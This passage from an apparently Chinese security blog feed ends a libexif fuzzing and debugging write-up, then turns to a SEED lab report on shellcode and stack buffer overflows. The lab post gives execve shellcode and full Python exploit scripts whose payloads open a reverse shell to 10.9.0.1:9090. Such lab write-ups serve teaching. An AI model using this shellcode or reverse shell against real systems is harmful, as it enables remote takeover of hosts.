class="line">find . -name &quot;exif-utils.c&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./libexif/exif-utils.c</span></span><br></pre></td></tr></table></figure><p>之后利用先前的gdb中backtrace（bt）查找调用栈。这里学到的一点是不能再fault之后再backtrace，好像和断在之前不一样。以下是断在segmentation fault之前的结果。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314141910400.png" alt="image-20220314141910400"></p><p>漏洞函数为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ExifSShort</span><br><span class="line"><span class="title function_">exif_get_sshort</span> <span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, ExifByteOrder order)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!buf) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (order) &#123;</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_MOTOROLA:</span><br><span class="line">                <span class="keyword">return</span> ((buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | buf[<span class="number">1</span>]); &lt;== crash here</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_INTEL:</span><br><span class="line">                <span class="keyword">return</span> ((buf[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | buf[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Won&#x27;t be reached */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由上面的分析，是传入的第一个参数有问题。</p><p>向上追溯，定位到以下关键函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExifShort</span><br><span class="line"><span class="title function_">exif_get_short</span> <span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, ExifByteOrder order)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (exif_get_sshort (buf, order) &amp; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来向上寻找，到<code>exif_data_load_data</code>第804行和819行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Fixed value */</span></span><br><span class="line"><span class="keyword">if</span> (exif_get_short (d + <span class="number">8</span>, data-&gt;priv-&gt;order) != <span class="number">0x002a</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// line 819</span></span><br><span class="line">n = exif_get_short (d + <span class="number">6</span> + offset, data-&gt;priv-&gt;order);</span><br><span class="line"><span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> + <span class="number">12</span> * n + <span class="number">4</span> &gt; ds) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里给d也就是buf加了一个8。可能就是这里的问题吗?(假设d为空?)断在这个函数之前调试一下。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314143045368.png" alt="image-20220314143045368"></p><p>看源码发现memcmp用的参数1和exif_get_short用的参数是一样的，查看了一下寄存器的值</p><p><img src="/2022/03/13/fuzzing-2/image-20220314143628351.png" alt="image-20220314143628351"></p><p>memcpy结束后，将会判定两者相等，从而跳出循环到下面的漏洞函数中。注意观察这一段汇编代码，正是判断是否等于0x002a的一段。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314143918338.png" alt="image-20220314143918338"></p><p>这一段应该直接被优化成内联汇编展开了，而不是函数调用(卡了好久，，就说为什么没有断上去)但是这一段现在没有问题，直接经过了??</p><p><img src="/2022/03/13/fuzzing-2/image-20220314145152643.png" alt="image-20220314145152643"></p><p>找这个问题还是挺麻烦的。但是我们知道了汇编代码的行数，尝试直接在汇编代码上面下断点?</p><p><img src="/2022/03/13/fuzzing-2/image-20220314145306512.png" alt="image-20220314145306512"></p><p>终于找到了，原来有两个地方调用了<code>exif_get_short</code>，在819行还有一个。这里看的就比较清楚了，是offset越界导致的错误。注意4294967295是0xFFFFFFFF！好的，找到了一个整数溢出的bug。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314150233892.png" alt="image-20220314150233892"></p><p>接下来就可以看源码找offset在哪里了。和offset相关的代码一定在这句话附近。我们逐个调试一下。分别在808,813行，最终定位到808行会出现问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* IFD 0 offset */</span></span><br><span class="line">offset = exif_get_long (d + <span class="number">10</span>, data-&gt;priv-&gt;order);</span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>, </span><br><span class="line">  <span class="string">&quot;IFD 0 at %i.&quot;</span>, (<span class="type">int</span>) offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parse the actual exif data (usually offset 14 from start) */</span></span><br><span class="line">exif_data_load_data_content (data, EXIF_IFD_0, d + <span class="number">6</span>, ds - <span class="number">6</span>, offset, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IFD 1 offset */</span></span><br><span class="line"><span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">n = exif_get_short (d + <span class="number">6</span> + offset, data-&gt;priv-&gt;order);</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/fuzzing-2/image-20220314150952796.png" alt="image-20220314150952796"></p><p>那搞了半天，应该是exif_get_long返回值的问题，如下</p><p><img src="/2022/03/13/fuzzing-2/image-20220314151059213.png" alt="image-20220314151059213"></p><p>下面是汇编部分，只用了一句汇编指令就完成了(不愧是intel!)关键是这里</p><p><img src="/2022/03/13/fuzzing-2/image-20220314152919806.png" alt="image-20220314152919806"></p><p>查询<a href="https://faydoc.tripod.com/cpu/bswap.htm">intel汇编手册</a></p><blockquote><p><strong>Description</strong><br> Reverses the byte order of a 32-bit (destination) register: bits 0  through 7 are swapped with bits 24 through 31, and bits 8 through 15 are swapped with bits 16 through 23. This instruction is provided for  converting little-endian values to big-endian format and vice versa.</p></blockquote><p>确实一句话完成了这个工作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) si</span><br><span class="line">(gdb) p $ebp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10 = -1</span></span><br></pre></td></tr></table></figure><p>感觉已经接近真相了！看看exp是哪里来的，是0xa(%r15)，应该就是这个函数的参数d+10!（exif-data.c第808行）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offset = exif_get_long (d + <span class="number">10</span>, data-&gt;priv-&gt;order);</span><br></pre></td></tr></table></figure><p>这里应该就是一个越界读的操作了，通过以下命令可以看出。至此，完成了我们的分析。</p><p><img src="/2022/03/13/fuzzing-2/image-20220314153340392.png" alt="image-20220314153340392"></p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>对上面offset返回值加上一个sanity-check，控制大小范围。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次是fuzz共享库，一方面要找共享库文件、使用共享库的文件、输入集合；另外一方面要学会怎么编译一个共享库，怎么使用afl-clang-lto编译。最重要的是，调试并复现漏洞(真的花了将近六个小时)，学到了一些，还是很有收获的。</p><ul><li>常用的下载网站</li></ul><p><a href="http://blog.fpliu.com/it/software/development/language/c/library/libexif/build-for-current-host">http://blog.fpliu.com/it/software/development/language/c/library/libexif/build-for-current-host</a></p>]]></content>
      
      
      <categories>
          
          <category> projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> fuzzing101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>software-security_lab1</title>
      <link href="/2022/03/09/software-security-lab1/"/>
      <url>/2022/03/09/software-security-lab1/</url>
      
        <content type="html"><![CDATA[<p>seed lab中关于shellcode和ret2libc攻击方法的一个作业。</p><span id="more"></span><h1 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h1><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>首先创建一个文件，如下图。</p><p><img src="/2022/03/09/software-security-lab1/image-20220309204944073.png" alt="image-20220309204944073"></p><p>以下过程表现删除了文件。首先输出1，其次执行rm删除本地的file_to_delete，接着输出2并进行ls</p><p><img src="/2022/03/09/software-security-lab1/image-20220309205644768.png" alt="image-20220309205644768"></p><p>代码如下，主要就是调用了/bin/rm来删除文件。并且用echo来表示顺序性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this shellcode to run any command you want</span></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;echo 1;/bin/ls;/bin/rm ./file_to_delete;echo 2;/bin/ls    *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">200</span>)</span><br><span class="line">content[<span class="number">0</span>:] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the binary code to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;codefile_32&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="汇编代码含义"><a href="#汇编代码含义" class="headerlink" title="汇编代码含义"></a>汇编代码含义</h2><p>分析一下这段汇编代码的含义。<img src="/2022/03/09/software-security-lab1/image-20220327103453852.png" alt="image-20220327103453852"></p><p>首先看到汇编代码跳转到0x2b位置，这里是call 0x2，又跳转回去。这样做的目的是call的时候，会把下面一条指令压栈，这样我们就能获得一个/bin/bash的参数储存在ebx里面。接下来的主要目的是构造系统调用(int 0x80)。查找系统调用号网站，可以看到相应的参数。</p><p><img src="/2022/03/09/software-security-lab1/image-20220327104256961.png" alt="image-20220327104256961"></p><p>之后把%al移动到[ebx+0x9]，为了让/bin/bash第9位为0(字符串终止符)接着把[ebx+0xc]，[ebx+0x47]都写成0。后面一直到20byte位置，都是在布置ecx参数。其实我们直接设置为0就行。最后设置)eax为0xb(execve的系统调用号)，打开/bin/bash。接下来，我们动态调试看看。</p><p>首先是pop ebx。可以看到我们成功拿到了/bin/bash这条命令</p><p><img src="/2022/03/09/software-security-lab1/image-20220327105324216.png" alt="image-20220327105324216"></p><p>接着通过ecx把/bin/sh后面的-c放到别的位置。([ebx+0xa]位置)</p><p><img src="/2022/03/09/software-security-lab1/image-20220327105500747.png" alt="image-20220327105500747"></p><p>接着的ebx+0xd是后面一个参数的位置。可以看到这一系列步骤其实是在分离/bin/bash以及后续的命令。</p><p><img src="/2022/03/09/software-security-lab1/image-20220327105658488.png" alt="image-20220327105658488"></p><p>后面到0xffffcf68， ecx被赋值成了/bin/bash。之后上面和系统调用相关的各个寄存器都被置为0，并且在0xffffcf6f的位置开始重新赋值。看一下寄存器赋值情况</p><p><img src="/2022/03/09/software-security-lab1/image-20220327110945473.png" alt="image-20220327110945473"></p><p>可以看到eax就是execve的系统调用号，ebx是/bin/bash字符串开始的地址，ecx是参数(也就是我们execve之后的命令)，如下所示，就是我们输入的命令的分割。</p><p><img src="/2022/03/09/software-security-lab1/image-20220327111308551.png" alt="image-20220327111308551"></p><p>edx是0。接下来就能完成execve(“/bin/bash”,argv[],envp[]了)。</p><h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>汇编语言的过程不在分析了，基本原理和上面很类似，就是64位要构造没有\x00的字符串会更加困难一些。</p><p>和上面的代码一模一样，以下为输出结果以及代码。</p><p><img src="/2022/03/09/software-security-lab1/image-20220309210013246.png" alt="image-20220309210013246"></p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this shellcode to run any command you want</span></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;echo 1;/bin/ls;/bin/rm ./file_to_delete;echo 2;/bin/ls    *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">200</span>)</span><br><span class="line">content[<span class="number">0</span>:] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the binary code to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;codefile_64&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br></pre></td></tr></table></figure><h1 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h1><p>先按照pdf的说明进行测试，找到buffer起始的栈地址为0xffffd068，返回地址为0xffffd0d8+4(为什么要+4，因为exp后面才是返回地址)</p><p><img src="/2022/03/09/software-security-lab1/image-20220310100302042.png" alt="image-20220310100302042"></p><p>因此，由于关闭了栈随机化，我们只要把返回地址写上shellcode所在地址即可。<strong>这里发现由于shellcode长度超出buffer到返回地址长度，因此不能再buffer开头写上shellcode。所以我们只能把shellcode放在buffer末尾位置</strong>。只需要计算好偏移，把偏移加上上面计算的(ebp+4)就可以了。我们得到以下的反向shell说明成功了。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310100243375.png" alt="image-20220310100243375"></p><p>以下为代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">128</span>               <span class="comment"># Change this number </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd0e8</span>     <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">116</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里考虑一个问题：能不能把shellcode放在start=0的位置?<strong>答案是不行的</strong>，因为我们shellcode的长度超过了buffer和返回地址之间的差值。放在start的地方将导致shellcode一部分被破坏(被写成了返回地址)。因此要放在返回地址的后面。</p><h1 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h1><p>task3不给我们显示返回地址，但是我们知道Buffer的长度在100到300之间，由此我们可以构造一个slide，让程序执行返回之后能够滑向我们的shellcode即可。</p><p>我们要做的，是先把shellcode放在300之后的位置，之后记下shellcode所在地址，把buffer中从100到300的位置全部填满shellcode的地址。<strong>从而无论buffer有多长，程序的返回地址总会被覆盖成我们的shellcode地址</strong>。</p><p>我们计算shellcode地址的方法是，用程序输出的buffer起始地址，加上shellcode的起始地址(在我的程序中是340)，由此得到0xffffd7ac。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310103639930.png" alt="image-20220310103639930"></p><p>以下为成功截图。</p><p><img src="/2022/03/09/software-security-lab1/image-20220310103611194.png" alt="image-20220310103611194"></p><p>以下为代码部分。代码末尾的循环表示设置buffer中100到300的位置全部为计算的shellcode地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">340</span>               <span class="comment"># Change this number </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd7ac</span>    <span class="comment"># Change this number </span></span><br><span class="line"><span class="comment"># offset = 116              # Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 